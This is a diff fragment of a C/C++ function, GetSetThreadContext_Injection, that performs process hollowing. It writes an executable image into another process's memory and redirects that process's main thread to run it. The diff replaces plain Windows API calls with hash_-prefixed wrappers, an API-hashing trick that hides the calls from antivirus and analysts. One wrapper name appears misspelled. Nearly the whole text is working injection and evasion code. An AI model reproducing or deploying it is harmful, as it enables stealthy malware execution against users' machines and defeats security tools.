@@ -48,7 +48,7 @@ BOOL GetSetThreadContext_Injection()
 		hash_ReadProcessQMemory(ProcessInfo.hProcess, LPCVOID(pContext->Ebx + 8), pTargetImageBase, 4, NULL);
 
 		// Opening source image
-		hFile = CreateFile(lpApplicationName2, GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
+		hFile = hash_CreateFileW(lpApplicationName2, GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
 		if (hFile == INVALID_HANDLE_VALUE)
 		{
 			print_last_error(_T("CreateFile"));
@@ -97,14 +97,14 @@ BOOL GetSetThreadContext_Injection()
 					}
 					else {
 
-						WriteProcessMemory(ProcessInfo.hProcess, pImageBase, pBuffer, pNTHeaders->OptionalHeader.SizeOfHeaders, NULL);
+						hash_WriteProcessMemory(ProcessInfo.hProcess, pImageBase, pBuffer, pNTHeaders->OptionalHeader.SizeOfHeaders, NULL);
 						for (int Count = 0; Count < pNTHeaders->FileHeader.NumberOfSections; Count++)
 						{
 							pImageSectionHeader = PIMAGE_SECTION_HEADER(DWORD(pBuffer) + pDosHeader->e_lfanew + 248 + (Count * 40));
-							WriteProcessMemory(ProcessInfo.hProcess, LPVOID(DWORD(pImageBase) + pImageSectionHeader->VirtualAddress),
+							hash_WriteProcessMemory(ProcessInfo.hProcess, LPVOID(DWORD(pImageBase) + pImageSectionHeader->VirtualAddress),
 								LPVOID(DWORD(pBuffer) + pImageSectionHeader->PointerToRawData), pImageSectionHeader->SizeOfRawData, NULL);
 						}
-						WriteProcessMemory(ProcessInfo.hProcess, LPVOID(pContext->Ebx + 8), LPVOID(&pNTHeaders->OptionalHeader.ImageBase), 4, NULL);
+						hash_WriteProcessMemory(ProcessInfo.hProcess, LPVOID(pContext->Ebx + 8), LPVOID(&pNTHeaders->OptionalHeader.ImageBase), 4, NULL);
 						pContext->Eax = DWORD(pImageBase) + pNTHeaders->OptionalHeader.AddressOfEntryPoint;
 						SetThreadContext(ProcessInfo.hThread, LPCONTEXT(pContext));
 
